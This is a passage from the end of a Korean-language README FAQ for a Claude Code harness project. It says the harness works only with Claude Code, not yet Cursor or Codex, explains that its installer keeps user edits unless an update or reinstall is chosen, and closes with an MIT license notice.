A. [CONTRIBUTING.md](./CONTRIBUTING.md) — 단계별 가이드.

**Q. Cursor / Codex에서도 쓸 수 있나?**
A. 아직 안 됨. Hook + `settings.json` 문법은 Claude Code 전용. agent-skills (npx skills)는 cross-host 동작 (Agent Skills 표준)이지만 하네스 orchestration은 Claude 전용.

**Q. 너무 의견이 많은데 override 가능한가?**
A. 가능. 인터랙티브 인스톨러는 기존 설치 감지 후 명시적 "업데이트/재설치" 액션 선택 시에만 덮어쓴다. 그전엔 `.claude/rules/*.md` 또는 `templates/*` 직접 편집해도 보존된다.

## License

MIT — Copyright (c) 2026 Jay (Uzys Jung). [LICENSE](./LICENSE) 참조.
